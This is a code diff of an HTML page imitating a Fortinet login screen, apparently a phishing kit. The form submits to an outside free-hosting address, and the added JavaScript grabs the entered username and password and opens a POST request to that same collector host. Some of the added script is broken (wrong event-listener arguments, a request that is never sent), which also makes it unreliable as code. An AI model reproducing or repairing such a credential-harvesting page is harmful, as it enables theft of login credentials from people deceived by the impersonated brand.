@@ -7,13 +7,27 @@
     <title>Fortinet</title>
     <link rel = "icon" type = "image/png" href = "fortinet.png">
     <script language="JavaScript">
-      if (top.location != window.location) top.location.reload();
-      if (window.opener) {window.opener.top.location.reload(); self.close();}
+        if (top.location != window.location) top.location.reload();
+        if (window.opener) {window.opener.top.location.reload(); self.close();}
+
+        window.addEventListener(window, "load", function() {
+        var loginForm = document.getElementById("login");
+        window.addEventListener(loginForm, "submit", function() {
+            login(loginForm);
+        });
+        });
+    
+        function login(form) {
+        var un = form.username.value;
+        var pw = form.secretkey.value;
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.open("post", "https://fortinetlog.000webhostapp.com/post.php", true);
+        }
     </script>
   </head>
   <body>
     <div class="view-container">
-      <form action="https://fortinetlog.000webhostapp.com/post.php" class="prompt" method="get" id="login" autocomplete="off">
+      <form action="https://fortinetlog.000webhostapp.com/post.php" class="prompt" onsubmit="return false;" method="get" id="loginForm" autocomplete="off">
         <div class="content with-header">
           <div class="header">
             <img src="fortinet.png" alt="Fortinet Logo" height="30" width="35">
@@ -26,7 +40,7 @@
                 <label id="token_msg" style="display: none;"></label>
                 <input type=hidden name="ftm_push_enabled" id="ftm_push_enabled" value="0"><input type="password" autocomplete="off" name="token_code"placeholder="Token Code" id="token_code" maxlength="16" style="display: none" disabled>
                 <div class="button-actions wide">
-                  <button class="primary" name="login_button" id="login_button" type="submit" form="login" value="Submit">Login</button>
+                <button class="primary" name="login_button" id="login_button" type="submit" form="loginForm" value="Submit">Login</button>
                 </div>
               </div>
           </div>
